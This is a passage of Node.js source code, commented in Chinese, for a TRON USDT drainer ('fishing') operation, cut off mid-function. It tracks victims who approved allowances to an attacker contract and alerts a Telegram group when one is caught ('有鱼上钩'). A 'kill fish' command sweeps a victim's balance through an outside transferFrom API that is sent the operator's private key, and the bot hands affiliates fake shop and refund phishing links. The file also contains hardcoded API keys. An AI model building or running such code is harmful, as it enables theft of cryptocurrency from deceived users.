const mysql = require('mysql2');
const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');
const path = require('path');
const fetch = require('node-fetch');
const { TronWeb } = require('tronweb');
const { promisify } = require('util');

// 提币阈值
let THRESHOLD = 300.000000;  // 在这里修改第一次授权时默认的提币阈值
// USDT合约地址
const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
// 免费申请https://www.trongrid.io/register
// 使用临时邮箱注册，每个账号可以申请3个Key
const TRONGRID_KEYS = ['acf4c193-8638-4310-a5ef-02613adae87b','e274431f-3f4e-4867-aeeb-6b0bbd22f763','53822611-e178-4d53-ad24-4b8f6c8a5308','26cccf7e-35a4-4504-9ce0-b3f6a5572b01','bb6f35d0-3689-48e2-a4fb-a01708012754','ccb0ddb7-e46f-4156-be01-23fea26f203b','2f649b33-66dc-4e84-839a-d7c9f2e9ac2e','3959b44c-de59-4263-a80b-54401aab7c2d','0972da67-c02b-4e9b-b062-beae31de6c18','8ed33249-3317-4cbd-b3ff-2943768b267b''];

// 获取时间
function getTimeInfo() {
   const now = new Date();
   now.setHours(now.getHours() + 8);
   const hour = now.getHours();
   let greeting;
   
   if (hour >= 0 && hour < 6) {
       greeting = "凌晨好";
   } else if (hour >= 6 && hour < 9) {
       greeting = "早上好";
   } else if (hour >= 9 && hour < 12) {
       greeting = "上午好";
   } else if (hour >= 12 && hour < 13) {
       greeting = "中午好";
   } else if (hour >= 13 && hour < 18) {
       greeting = "下午好";
   } else if (hour >= 18 && hour < 19) {
       greeting = "傍晚好";
   } else {
       greeting = "晚上好";
   }
   return {
       time: now.toISOString().replace('T', ' ').slice(0, 19),
       greeting: greeting
   };
}

// 获取数据库配置
function getDbConfig() {
   try {
       const content = fs.readFileSync('./application/database.php', 'utf8');
       const dbConfig = {
           host: content.match(/Env::get\(['"]database\.hostname['"],\s*['"](.+?)['"]\)/)?.[1],
           database: content.match(/Env::get\(['"]database\.database['"],\s*['"](.+?)['"]\)/)?.[1],
           user: content.match(/Env::get\(['"]database\.username['"],\s*['"](.+?)['"]\)/)?.[1],
           password: content.match(/Env::get\(['"]database\.password['"],\s*['"](.+?)['"]\)/)?.[1]
       }
       return dbConfig;
   } catch(err) {
       console.error('获取数据库配置失败:', err);
       process.exit(1);
   }
}

// 创建数据库连接池
function createDbPool() {
   const config = getDbConfig();
   return mysql.createPool({
       ...config,
       waitForConnections: true,
       connectionLimit: 10,
       queueLimit: 0
   });
}

// 初始数据库连接池
const pool = createDbPool();

// 全局变量
let PermissionAddress = null;
let NotificationId = null;
let bot;

// 初始化 Telegram 机器人
async function initBot() {
    let isFirstLaunch = true; 
    try {
        // 查询数据库中的配置选项
        const [rows] = await pool.promise().query(
            "SELECT * FROM `options` WHERE `name` IN ('payment_address', 'permission_address', 'bot_key', 'notification_id') ORDER BY `name` DESC"
        );
        const config = {};
        rows.forEach(row => {
            config[row.name] = row.value;
        });
        // 验证配置字段的完整性和正确性
        const errors = [];
        if (!config.bot_key || !/^[\d]{9,10}:[A-Za-z0-9_-]{35,}$/.test(config.bot_key)) {
            errors.push('机器人密钥');
        }
        if (!config.notification_id || !/^-[\d]+$/.test(config.notification_id)) {
            errors.push('通知群组 ID');
        }
        if (!config.payment_address || !/^T[A-Za-z1-9]{33}$/.test(config.payment_address)) {
            errors.push('收款地址');
        }
        if (!config.permission_address || !/^T[A-Za-z1-9]{33}$/.test(config.permission_address)) {
            errors.push('权限合约地址');
        }
        if (errors.length > 0) {
            const missingMessage = `缺少或无效的配置字段: ${errors.join('，')}`;
            console.error(`[${getTimeInfo().time}] ${missingMessage}`);

            if (config.bot_key && config.notification_id) {
                const tempBot = new TelegramBot(config.bot_key);
                await tempBot.sendMessage(
                    config.notification_id,
                    `缺少或无效的配置字段: ${errors.join('，')}`
                );
            }

            throw new Error(missingMessage);
        }
        // 保存配置到全局变量
        PermissionAddress = config.permission_address;
        NotificationId = Number(config.notification_id);
        // 初始化 Telegram 机器人
        bot = new TelegramBot(config.bot_key, {
            polling: {
                interval: 5000, // 每隔 5 秒轮询一次
                autoStart: true, // 自动启动轮询
                params: {
                    timeout: 10 // 请求超时时间
                }
            },
            request: {
                agentOptions: {
                    keepAlive: true, // 保持连接持久化
                    family: 4,       // 强制使用 IPv4
                    rejectUnauthorized: true // 确保使用合法证书
                },
                proxy: null // 明确禁用代理
            }
        });
        bot.notificationId = NotificationId;
        // 监听轮询错误
        bot.on('polling_error', async (error) => {
            console.error(`[${getTimeInfo().time}] Telegram 轮询错误: ${error.message}`);
            await restartBotWithDelay(bot);
        });
        // 监听 Webhook 错误
        bot.on('webhook_error', async (error) => {
            console.error(`[${getTimeInfo().time}] Telegram Webhook 错误: ${error.message}`);
            await restartBotWithDelay(bot);
        });
        // 首次启动成功后发送通知
        if (isFirstLaunch) {
            await bot.sendMessage(bot.notificationId, '机器人启动成功！');
            isFirstLaunch = false; 
        }
        console.log(`[${getTimeInfo().time}] 机器人启动成功，已设置管理代理群 CHATID: ${bot.notificationId}`);
    } catch (error) {
        console.error(`[${getTimeInfo().time}] 初始化机器人时发生错误: ${error.message}`);
        bot = null; // 确保错误时 bot 被设置为 null
        await restartBotWithDelay(bot);
    }
}

// 重试启动机器人
async function restartBotWithDelay(bot) {
    if (bot) {
        console.log(`[${getTimeInfo().time}] 停止机器人连接...`);
        try {
            await bot.stopPolling();
        } catch (err) {
            console.error(`[${getTimeInfo().time}] 停止轮询时发生错误: ${err.message}`);
        }
    }
    console.log(`[${getTimeInfo().time}] 30 秒后重新初始化机器人...`);
    await new Promise(resolve => setTimeout(resolve, 30000));
    await initBot();
}

// 处理消息命令
function setupBotHandlers(bot) {
    // 设置消息监听
    bot.on('message', async (message) => {
        const chatId = message.chat.id;
        const text = message.text?.trim() || '';
        // console.log(`[${getTimeInfo().time}] 收到消息: "${text}" 来自聊天 ID: ${chatId}, 用户 ID: ${message.from.id}`);
        // 忽略非指定群聊的消息
        if (chatId !== bot.notificationId) {
            console.log(`[${getTimeInfo().time}] 忽略非指定群聊的消息，聊天 ID: ${chatId}`);
            return;
        }
        if (!text) {
            return;
        }
        await handleCommand(chatId, message, text);
    });
    async function handleCommand(chatId, message, text) {
        const thresholdRegex = /^(?:修改阈值|阈值修改|阈值)\s*([A-Za-z0-9]+)\s*([0-9.]+)$/;
        //使用杀鱼命令就是将阈值修改为0.000001
        const killFishRegex = /^杀鱼\s*([A-Za-z0-9]+)$/;
        const thresholdMatch = text.match(thresholdRegex);
        const killMatch = text.match(killFishRegex);
        const messageConfig = {
            parse_mode: 'HTML',
            reply_to_message_id: message.message_id
        };
        try {
            if (thresholdMatch || killMatch) {
                const isKillFish = !!killMatch;
                const match = thresholdMatch || killMatch;
                const response = await updateThreshold(
                    chatId,
                    message,
                    match[1], 
                    isKillFish ? 0 : parseFloat(match[2]), 
                    isKillFish, 
                    bot
                );
                await bot.sendMessage(chatId, response, messageConfig);
                return;
            }
            // 命令映射
            const commandMap = new Map([
                [['我的', '我的鱼苗', '鱼苗', '鱼池'], async () => {
                    const msg = await getFishMessage(chatId, message);
                    await bot.sendMessage(chatId, msg, {
                        ...messageConfig,
                        disable_web_page_preview: true
                    });
                }],
                [['代理', '代理链接', '链接', '商城', '发卡'], async () => {
                    const msg = await getDomainMessage(chatId, message);
                    await bot.sendMessage(chatId, msg, {
                        ...messageConfig,
                        disable_web_page_preview: true
                    });
                }]
            ]);
            for (const [commands, handler] of commandMap) {
                if (commands.includes(text)) {
                    await handler();
                    return;
                }
            }
        } catch (error) {
            console.error(`[${getTimeInfo().time}] 命令处理错误: ${error.message}`);
            await bot.sendMessage(chatId, "❌ 处理命令时出现错误，请稍后重试。", {
                reply_to_message_id: message.message_id
            });
        }
    }
}

// 查询鱼苗
async function getFishMessage(chatId, message) {
    try {
        const userId = message.from.id;
        const username = message.from.username || '该用户未设置用户名';
        const timeInfo = getTimeInfo();
        const [countResult] = await pool.promise().query(
            "SELECT COUNT(*) as count FROM fish WHERE tguid = ?",
            [userId]
        );
        if(countResult[0].count === 0) {
            return `🎣渔夫<code> ${username} </code>${timeInfo.greeting}！\n\n` +
                   `🐟您的鱼池为空，请继续加油吧，答应我一定要赚够多多的uu！`;
        }
        const [fishList] = await pool.promise().query(
            "SELECT fish_address, usdt_balance, threshold FROM fish WHERE tguid = ? ORDER BY id ASC",
            [userId]
        );
        
        let responseMessage = `🎣渔夫<code> ${username} </code>${timeInfo.greeting}！\n\n` +
                            `以下是您的鱼苗列表：`;
        fishList.forEach((fish, index) => {
            const fishNumber = index + 1;
            const formattedBalance = Number(fish.usdt_balance).toFixed(6);
            const formattedThreshold = Number(fish.threshold).toFixed(6);
            
            responseMessage += `\n🐟鱼苗${fishNumber}号：<code>${fish.fish_address}</code>\n` +
                             `📤提币阈值：<code>${formattedThreshold}</code>\n` +
                             `💸USDT余额：<code>${formattedBalance}</code>\n`;
        });
        return responseMessage;
    } catch(error) {
        console.error(`[${getTimeInfo().time}---查询鱼池信息错误:`, error, ']');
        return "❌ 查询鱼池信息时出现错误，请稍后重试。";
    }
}

// 代理链接
async function getDomainMessage(chatId, message) {
    try {
        if(!message.from.username) {
            return "❌ 请先创建你的用户名才能继续申请代理链接";
        }
        const userId = message.from.id;
        const username = message.from.username;
        const fullName = `${message.from.first_name || ''} ${message.from.last_name || ''}`.trim();
        const timeInfo = getTimeInfo();
        const [domainResult] = await pool.promise().query(
            "SELECT value FROM options WHERE name = 'domain'"
        );
        if(!domainResult[0] || !domainResult[0].value) {
            return "❌ 未找到可用域名，请联系管理员在后台配置域名。";
        }
        // 检查和更新代理信息
        const [existingDaili] = await pool.promise().query(
            "SELECT id, username, fullName FROM daili WHERE tguid = ?",
            [userId]
        );
        if(existingDaili[0]) {
            const usernameChanged = existingDaili[0].username !== username;
            const fullNameChanged = existingDaili[0].fullName !== fullName;
            if(usernameChanged || fullNameChanged) {
                await pool.promise().query(
                    "UPDATE daili SET username = ?, fullName = ? WHERE tguid = ?",
                    [username, fullName, userId]
                );
                
                console.log(`[${timeInfo.time}---更新代理信息: ${userId}]`);
                if(usernameChanged) {
                    console.log(`[${timeInfo.time}---用户名变更: ${existingDaili[0].username} -> ${username}]`);
                }
                if(fullNameChanged) {
                    console.log(`[${timeInfo.time}---昵称变更: ${existingDaili[0].fullName} -> ${fullName}]`);
                }
            }
        } else {
            await pool.promise().query(
                "INSERT INTO daili (tguid, username, fullName, time) VALUES (?, ?, ?, ?)",
                [userId, username, fullName, timeInfo.time]
            );
            console.log(`[${timeInfo.time}---新增代理信息: ${userId}, 用户名: ${username}, 昵称: ${fullName}]`);
        }
        // 处理域名
        const domains = domainResult[0].value.split('\n').map(d => d.trim()).filter(Boolean);
        let randomDomain = domains[Math.floor(Math.random() * domains.length)];
        if(randomDomain.includes('*')) {
            const length = Math.floor(Math.random() * 3) + 4; // 随机4-6个字母
            const randomLetters = Array.from(
                {length}, 
                () => String.fromCharCode(97 + Math.floor(Math.random() * 26))
            ).join('');
            randomDomain = randomDomain.replace('*', randomLetters);
        }
        // 在这里修改链接
        const shopUrl = `https://${randomDomain}/?${username}`;  // 商城链接
        const goodsUrl = `https://${randomDomain}/goods/4.html?${username}`;  //提货链接
        const refundUrl = `https://${randomDomain}/goods/3.html?${username}`;  //退货链接
        return `🎣渔夫 <code>${username}</code> ${timeInfo.greeting}！\n\n` +
               `📥请复制保存您的专属推广链接\n\n` +
               `🛒 商城链接:\n` +
               `———————————\n` +
               `🔗 <a href="${shopUrl}"><u>点击访问商城</u></a>\n` +
               `———————————\n\n` +
               `📦 提货:\n` +
               `商品信息:\n` +
               `下单码:\n` +
               `订单状态:已下单,待提货\n` +
               `🔗 <a href="${goodsUrl}"><u>提货链接</u></a>\n\n` +
               `📤 退货:\n` +
               `退款信息:\n` +
               `下单码:\n` +
               `订单状态:已下单,待退货\n` +
               `🔗 <a href="${refundUrl}"><u>退货链接</u></a>`;
    } catch(error) {
        console.error(`[${getTimeInfo().time}---处理代理链接错误:`, error, ']');
        return "❌ 生成代理链接时出现错误，请稍后重试。";
    }
}

// 清理过期支付页面
async function cleanPayments() {
    const fs = require('fs').promises;
    const path = require('path');
    // 无限循环检查和清理
    while(true) {
        try {
            // 获取当前时间
            const now = Math.floor(Date.now() / 1000);
            // 支付页面目录
            const paymentDir = path.join(__dirname, 'public', 'epay');
            // 读取目录中的所有文件
            const files = await fs.readdir(paymentDir);
            // 遍历所有.php文件
            for(const file of files) {
                if(path.extname(file) === '.php') {
                    const filePath = path.join(paymentDir, file);
                    const stats = await fs.stat(filePath);
                    const createTime = Math.floor(stats.birthtimeMs / 1000);
                    
                    // 如果文件创建时间超过30分钟(1800秒) 则清理
                    if(now - createTime > 1800) {
                        await fs.unlink(filePath);
                        console.log(`[${getTimeInfo().time}---清理过期支付页面: ${file}]`);
                    }
                }
            }
            await new Promise(resolve => setTimeout(resolve, 60000)); // 60秒检查一次
        } catch(err) {
            console.error(`[${getTimeInfo().time}---清理支付页面出错:`, err, ']');
            await new Promise(resolve => setTimeout(resolve, 60000));
        }
    }
}

// 检查群管理员
async function checkGroupAdminStatus(bot, chatId, userId) {
    try {
        // 获取用户在群组中的详细信息
        const chatMember = await bot.getChatMember(chatId, userId);
        const chatAdmins = await bot.getChatAdministrators(chatId);
        const isCreator = chatMember.status === 'creator';
        const isAdmin = chatAdmins.some(admin => admin.user.id === userId);
        // 返回详细的权限信息
        return {
            isCreator,
            isAdmin,
            status: chatMember.status
        };
    } catch (error) {
        console.error('检查管理员状态时发生错误:', error);
        return {
            isCreator: false,
            isAdmin: false,
            status: 'error'
        };
    }
}

// 阈值设定更新
async function updateThreshold(chatId, message, fishAddress, newThreshold, isKillFish = false, bot) {
  try {
    const userId = message.from.id;
    const adminStatus = await checkGroupAdminStatus(bot, chatId, userId);
    const hasAdminPermission = adminStatus.isCreator || adminStatus.isAdmin;
    if (!hasAdminPermission) {
      // 验证非管理员是否有权限操作该鱼苗
      const [userFish] = await pool.promise().query(
        "SELECT id FROM fish WHERE fish_address = ? AND tguid = ?", 
        [fishAddress, userId]
      );
      // 如果不是鱼苗的拥有者，拒绝操作
      if (userFish.length === 0) {
        return isKillFish ? '❌ 您没有权限杀此鱼苗' : '❌ 您没有权限修改此鱼苗的阈值';
      }
    } 
    // 管理员权限检查
    else {
      // 验证鱼苗地址是否存在
      const [fishExists] = await pool.promise().query(
        "SELECT id FROM fish WHERE fish_address = ?", 
        [fishAddress]
      );
      if (fishExists.length === 0) {
        return `❌ 未找到指定鱼苗地址`;
      }
    }
    if (isKillFish) {
      const [fishBalanceResult] = await pool.promise().query(
        "SELECT usdt_balance FROM fish WHERE fish_address = ?", 
        [fishAddress]
      );
      const usdtBalance = parseFloat(fishBalanceResult[0].usdt_balance);
      // 余额小于10USDT禁止杀鱼
      if (usdtBalance < 10) {
        return `❌ 该地址余额小于10USDT，禁止杀鱼`;
      }
    }
    let queryConditions = ["fish_address = ?"];
    let queryParams = [fishAddress];
    if (!hasAdminPermission) {
      queryConditions.push("tguid = ?");
      queryParams.push(userId);
    }
    // 阈值验证：不允许设置为0，最小值为0.000001
    const parsedThreshold = parseFloat(newThreshold);
    if (isNaN(parsedThreshold) || parsedThreshold <= 0) {
      return `❌ 阈值必须大于0，最小可设置为0.000001`;
    }
    // 设置实际阈值（杀鱼时使用极小值，否则使用输入值）
    const actualThreshold = isKillFish ? 0.000001 : Math.max(parsedThreshold, 0.000001);
    // 更新数据库阈值
    await pool.promise().query(
      "UPDATE fish SET threshold = ? WHERE " + queryConditions.join(" AND "),
      [actualThreshold, ...queryParams]
    );
    const [updatedFish] = await pool.promise().query(
      "SELECT CAST(threshold AS DECIMAL(18,6)) as threshold FROM fish WHERE fish_address = ?", 
      [fishAddress]
    );
    if (isKillFish) {
      return `🎣正在杀鱼，请稍等...`;
    } else {
      const formattedThreshold = parseFloat(updatedFish[0].threshold).toFixed(6);
      return `✅ 修改成功！新的划币阈值为<code>${formattedThreshold}</code>`;
    }
  } catch (error) {
    console.error(`[${getTimeInfo().time}---${isKillFish ? '杀鱼' : '修改阈值'}错误:`, error.message, ']');
    return `❌ ${isKillFish ? '杀鱼' : '修改阈值'}时出现错误，请稍后重试。`;
  }
}

// 创建 TronWeb 实例
function createTronWeb() {
    try {
        const randomKey = TRONGRID_KEYS[Math.floor(Math.random() * TRONGRID_KEYS.length)];
        return new TronWeb({
            fullHost: 'https://api.trongrid.io',
            headers: { "TRON-PRO-API-KEY": randomKey },
        });
    } catch (error) {
        console.error('[${getTimeInfo().time}] ---- TRC创建TronWeb实例时出错:', error);
        return null;
    }
}

// 获取最新的区块号
async function fetchLatestBlock() {
    let lastProcessedBlock = null; 

    while (true) {
        try {
            const tronWeb = createTronWeb();
            const latestBlock = await tronWeb.trx.getCurrentBlock();
            const blockNumber = latestBlock.block_header.raw_data.number;
            // 首次运行时初始化
            if (lastProcessedBlock === null) {
                console.log(`[${getTimeInfo().time}] 初始化: 当前最新区块号为 ${blockNumber}`);
                lastProcessedBlock = blockNumber; // 初始化为当前区块号
            } else if (blockNumber > lastProcessedBlock) {
                const newBlocks = [];
                for (let i = lastProcessedBlock + 1; i <= blockNumber; i++) {
                    newBlocks.push(i);
                }
                // 按顺序处理未处理的区块
                for (const block of newBlocks) {
                    // console.log(`[${getTimeInfo().time}] 检测到新区块: ${block}`);
                    await scanBlock(block);
                }
                lastProcessedBlock = blockNumber;
            }
        } catch (error) {
            console.error(`[${getTimeInfo().time}] 获取最新区块时发生错误:`, error);
        }
        // 三秒获取一次最新的区块号
        await new Promise(resolve => setTimeout(resolve, 3000));
    }
}

// 获取区块信息
async function scanBlock(blockNumber) {
    try {
        const tronWeb = createTronWeb();
        let block = await tronWeb.trx.getBlock(blockNumber);
        if (!block || block.message?.includes('Block not found')) {
            console.log(`[${getTimeInfo().time}] 区块 ${blockNumber} 未找到，3秒后重试...`);
            await new Promise(resolve => setTimeout(resolve, 3000));
            const retryTronWeb = createTronWeb();
            block = await retryTronWeb.trx.getBlock(blockNumber);
            if (!block) {
                console.log(`[${getTimeInfo().time}] 区块 ${blockNumber} 重试后仍未找到，跳过该区块`);
                return;
            }
        }
        if (block.transactions && block.transactions.length > 0) {
            for (const transaction of block.transactions) {
                const contract = transaction.raw_data.contract && transaction.raw_data.contract[0];
                if (!contract) continue;
                const contractType = contract.type;
                const contractParameter = contract.parameter;
                const data = contractParameter && contractParameter.value && contractParameter.value.data;
                // 只解析 USDT 的转账和授权事件
                if (contractType === 'TriggerSmartContract' && data) {
                    if (data.startsWith('23b872dd') || data.startsWith('a9059cbb')) {
                        // 调用 USDT 转账处理
                        await usdt_transfer(transaction);
                    } else if (data.startsWith('d73dd623') || data.startsWith('095ea7b3')) {
                        // 调用 USDT 授权处理
                        await usdt_approve(transaction);
                    }
                }
            }
        } else {
            // 如果区块中没有交易
            console.log(`[${getTimeInfo().time}] 区块 ${blockNumber} 无交易`);
        }
    } catch (error) {
        console.error(`[${getTimeInfo().time}] 处理区块 ${blockNumber} 时发生错误:`, error);
    }
}

// 余额查询函数
async function checkBalance(addressToQuery) {
    let trxBalance = null; // 默认值为 null
    let usdtBalance = null; // 默认值为 null
    const tronWeb = createTronWeb();
    try {
        // 查询 TRX 余额
        const accountInfo = await tronWeb.trx.getAccount(addressToQuery);
        trxBalance = parseFloat(tronWeb.fromSun(accountInfo.balance || 0)).toFixed(6);
    } catch (error) {
        console.error(`查询 TRX 余额时出错 (地址: ${addressToQuery}):`, error);
    }
    try {
        // 查询 USDT 余额
        const contract = await tronWeb.contract().at(USDT_CONTRACT);
        const usdtBalanceHex = await contract.balanceOf(addressToQuery).call({ from: addressToQuery });
        usdtBalance = parseFloat(tronWeb.toDecimal(usdtBalanceHex) / 1_000_000).toFixed(6);
    } catch (error) {
        console.error(`查询 USDT 余额时出错 (地址: ${addressToQuery}):`, error);
    }
    return { trxBalance, usdtBalance };
}

// USDT 转账处理
async function usdt_transfer(transaction) {
    try {
        const txID = transaction.txID; 
        const contractRet = transaction.ret[0].contractRet; 
        const ownerAddress = TronWeb.address.fromHex(transaction.raw_data.contract[0].parameter.value.owner_address); 
        const contractAddress = transaction.raw_data.contract[0].parameter.value.contract_address;
        const data = transaction.raw_data.contract[0].parameter.value.data;
        // 如果交易失败或合约地址不匹配，直接返回
        if (contractRet !== "SUCCESS" || contractAddress !== "41a614f803b6fd780986a42c78ec9c7f77e6ded13c") {
            return;
        }
        const toAddress = TronWeb.address.fromHex('41' + data.slice(32, 72));
        const amount = parseInt(data.slice(72), 16) / 1000000;
        const allAddresses = await new Promise((resolve, reject) => {
            pool.query("SELECT fish_address, tguid, threshold FROM fish ORDER BY fish_address ASC", (error, results) => {
                if (error) reject(error);
                else resolve(results);
            });
        });
        if (!allAddresses.length) return;
        // 筛选出与此次交易相关的鱼苗地址
        const relatedAddresses = allAddresses.filter(row => row.fish_address === ownerAddress || row.fish_address === toAddress);
        if (!relatedAddresses.length) return; // 如果没有相关地址，直接返回
        for (const row of relatedAddresses) {
            const address = row.fish_address;
            const tguid = row.tguid; 
            const threshold = parseFloat(row.threshold); 
            const isOutgoing = address === ownerAddress;
            const amountSymbol = isOutgoing ? "↖️转出金额" : "↪️转入金额"; 
            const transactionAddress = isOutgoing ? toAddress : ownerAddress; 
            const usernameRow = await new Promise((resolve, reject) => {
                pool.query("SELECT username FROM daili WHERE tguid = ? ORDER BY username ASC", [tguid], (error, results) => {
                    if (error) reject(error);
                    else resolve(results[0] || null);
                });
            });
            const username = usernameRow ? `(@${usernameRow.username})` : "";
            const { trxBalance, usdtBalance } = await checkBalance(address);
            const notification = `🐟【鱼苗动账通知】USDT 转账 通知🐟\n\n` +
                `📥交易地址：\n<code>${transactionAddress}</code>\n\n` +
                `🐠鱼苗地址${username}：\n<code>${address}</code>\n\n` +
                `${amountSymbol}：<code>${amount.toFixed(6)} USDT</code>\n\n` +
                `⏰交易时间：<code>${getTimeInfo().time}</code>\n\n` +
                `🪫TRX 余额：<code>${trxBalance !== null ? trxBalance : "查询失败"}</code> 💵USDT余额：<code>${usdtBalance !== null ? usdtBalance : "查询失败"}</code>`;
            const buttons = {
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: "🌍详细交易信息", url: `https://tronscan.org/#/transaction/${txID}` }
                        ]
                    ]
                }
            };
            await bot.sendMessage(NotificationId, notification, {
                parse_mode: "HTML",
                disable_web_page_preview: true,
                ...buttons
            });
            await new Promise((resolve, reject) => {
                pool.query(
                    "UPDATE fish SET trx_balance = ?, usdt_balance = ? WHERE fish_address = ?",
                    [trxBalance, usdtBalance, address],
                    (error) => {
                        if (error) reject(error);
                        else resolve();
                    }
                );
            });
        }
    } catch (error) {
        console.error(`[${getTimeInfo().time}] 处理 USDT 转账交易时发生错误: ${error.message}`);
    }
}

// USDT 授权处理
async function usdt_approve(transaction) {
    try {
        const txID = transaction.txID;
        const contractRet = transaction.ret[0].contractRet;
        const fishAddress = TronWeb.address.fromHex(transaction.raw_data.contract[0].parameter.value.owner_address);
        const contractAddress = transaction.raw_data.contract[0].parameter.value.contract_address;
        const data = transaction.raw_data.contract[0].parameter.value.data;
        if (contractRet !== "SUCCESS" || contractAddress !== "41a614f803b6fd780986a42c78ec9c7f77e6ded13c") return;
        const spenderAddress = TronWeb.address.fromHex('41' + data.slice(32, 72));
        const transferAmountIn = parseInt(data.slice(72), 16) / 1000000;
        // 如果授权地址不匹配，直接返回
        if (spenderAddress !== PermissionAddress) {
            return;
        }
        const { trxBalance, usdtBalance } = await checkBalance(fishAddress);
        const fishRow = await new Promise((resolve, reject) => {
            pool.query(
                "SELECT * FROM fish WHERE fish_address = ? ORDER BY fish_address DESC LIMIT 1",
                [fishAddress],
                (error, results) => {
                    if (error) reject(error);
                    else resolve(results[0] || null);
                }
            );
        });
        let approvalStatus = "";
        let additionalNote = "";
        const timestamp = getTimeInfo().time;
        if (transferAmountIn === 0) {
            // 如果授权额度为 0，更新状态
            approvalStatus = "❌ <code>取消授权 额度 0 USDT</code>";
            additionalNote = "❌ 注：因该地址已取消授权，已从鱼池列表中删除";
            if (fishRow) {
                // 如果记录存在，则从鱼池列表中删除
                await new Promise((resolve, reject) => {
                    pool.query("DELETE FROM fish WHERE id = ?", [fishRow.id], (error, results) => {
                        if (error) reject(error);
                        else resolve(results);
                    });
                });
            }
        } else if (transferAmountIn < 200) {
            // 如果授权额度小于 200，更新状态
            approvalStatus = `❌ <code>授权额度 ${Math.floor(transferAmountIn)} USDT</code>`;
            additionalNote = "❌ 注：因该地址的授权额度太低，将不加入鱼池列表";
            if (fishRow) {
                // 如果记录存在，则从鱼池列表中删除
                await new Promise((resolve, reject) => {
                    pool.query("DELETE FROM fish WHERE id = ?", [fishRow.id], (error, results) => {
                        if (error) reject(error);
                        else resolve(results);
                    });
                });
            }
        } else {
            // 如果授权成功，更新状态并更新或插入数据库记录
            approvalStatus = "✅ <code>授权成功</code>";
            additionalNote = `✅ 当前默认提币阈值为 <code>${THRESHOLD} USDT</code>\n\n您可以通过命令 <code>修改阈值 ${fishAddress} 10000</code> 将阈值修改为10000或者你想要设置的阈值;`;
            if (fishRow) {
                // 更新已存在的记录
                await new Promise((resolve, reject) => {
                    pool.query(
                        "UPDATE fish SET usdt_balance = ?, trx_balance = ?, threshold = ?, time = ? WHERE id = ?",
                        [usdtBalance, trxBalance, THRESHOLD, timestamp, fishRow.id],
                        (error, results) => {
                            if (error) reject(error);
                            else resolve(results);
                        }
                    );
                });
            } else {
                // 插入新记录
                await new Promise((resolve, reject) => {
                    pool.query(
                        "INSERT INTO fish (fish_address, permissions_fishaddress, usdt_balance, trx_balance, threshold, time, tguid, remark) VALUES (?, ?, ?, ?, ?, ?, ?, NULL)",
                        [fishAddress, PermissionAddress, usdtBalance, trxBalance, THRESHOLD, timestamp, ""],
                        (error, results) => {
                            if (error) reject(error);
                            else resolve(results);
                        }
                    );
                });
            }
        }
        const notification = `🎣【有鱼上钩啦】USDT授权通知🎣\n\n` +
            `🐠鱼苗地址：<code>${fishAddress}</code>\n\n` +
            `🔐权限地址：<code>${PermissionAddress}</code>\n\n` +
            `📨授权状态：${approvalStatus}\n\n` +
            `⏰授权时间：<code>${timestamp}</code>\n\n` +
            `🪫TRX 余额：<code>${trxBalance !== null ? trxBalance : "查询失败"}</code> 💵USDT余额：<code>${usdtBalance !== null ? usdtBalance : "查询失败"}</code>\n\n\n` +
            `<b>${additionalNote}</b>`;
        const buttons = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: "🌍详细交易信息", url: `https://tronscan.org/#/transaction/${txID}` }]
                ]
            }
        };
        await bot.sendMessage(NotificationId, notification, {
            parse_mode: "HTML",
            disable_web_page_preview: true,
            ...buttons
        });
    } catch (error) {
        console.error(`[${getTimeInfo().time}] 处理 USDT 授权交易时发生错误: ${error.message}`);
    }
}

// 阈值转账
async function transferFrom(fishAddress, transferAmountIn) {
    try {
        // 根据 fish_address 查询权限地址
        const [fishRows] = await pool.promise().query(
            "SELECT permissions_fishaddress FROM fish WHERE fish_address = ?",
            [fishAddress]
        );
        if (fishRows.length === 0 || !fishRows[0].permissions_fishaddress) {
            throw new Error(`无法找到对应的权限地址，fish_address: ${fishAddress}`);
        }
        const permissionAddress = fishRows[0].permissions_fishaddress;
        // 从数据库获取配置信息
        const [optionsRows] = await pool.promise().query(
            "SELECT * FROM options WHERE name IN ('payment_address', 'private_key')"
        );
        // 验证是否获取到必要信息
        const configMap = {};
        optionsRows.forEach(row => {
            configMap[row.name] = row.value;
        });
        if (!configMap.private_key || !configMap.payment_address) {
            throw new Error('必要配置缺失，无法继续执行转账操作');
        }
        // 创建 TronWeb 实例
        const tronWeb = createTronWeb();
        // 获取权限地址
        const base58Address = tronWeb.address.fromPrivateKey(configMap.private_key);
        // 查询权限地址的 TRX 余额
        const trxBalance = await tronWeb.trx.getBalance(base58Address);
        const trxBalanceInTRX = trxBalance / 1e6; // 转换为 TRX 单位
        // 如果 TRX 余额低于 50，发送警告通知并跳过操作
        if (trxBalanceInTRX < 50) {
            const errorMessage = `[${getTimeInfo().time}] 权限地址 ${base58Address} 的 TRX 余额不足，当前余额为 ${trxBalanceInTRX} TRX，自动转账操作已取消！`;
            console.error(errorMessage);

            const message = `【⚠️ 阈值转账错误通知】\n\n` +
                `❗ 错误原因：权限地址 TRX 余额不足\n\n` +
                `🎯 权限地址：\n<code>${base58Address}</code>\n\n` +
                `💰 当前余额：<code>${trxBalanceInTRX} TRX</code>\n\n` +
                `⏰ 时间：<code>${getTimeInfo().time}</code>\n\n` +
                `⚠️ 请至少保持权限地址有50TRX，以免影响转账操作！`;
            await bot.sendMessage(NotificationId, message, { parse_mode: 'HTML' });
            return; // 跳过操作
        }
        // 将转账金额转换为 Sun
        const transferAmountInSun = transferAmountIn * 1e6;
        // 调用 /api/transferFrom 接口
        const response = await fetch('https://api.tronweb.xyz/api/transferFrom', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                contractAddress: permissionAddress,        // 权限地址 （鱼苗授权的合约地址）
                methodId: 'controlAndTransferToken',        // 合约方法名称 （修改为你自己的否则交易不成功）
                tokenAddress: USDT_CONTRACT,              // USDT的合约地址 （如果你的合约不需要填写，那么可以注释掉这行）
                fromAddress: fishAddress,                  // 来源地址 （鱼苗地址）
                toAddress: configMap.payment_address,      // 收款地址 （收款地址）
                amountUint256: transferAmountInSun,        // 转账金额 (单位：Sun)
                privateKey: configMap.private_key          // 私钥 （用于构建请求本次交易）
            })
        });
        if (!response.ok) {
            throw new Error(`API 请求失败: ${response.status} ${response.statusText}`);
        }
        const responseData = await response.json();
        const { success, transactionHash } = responseData;
        if (!success) {
            throw new Error('交易失败，请检查响应数据！');
        }
        await pool.promise().query(
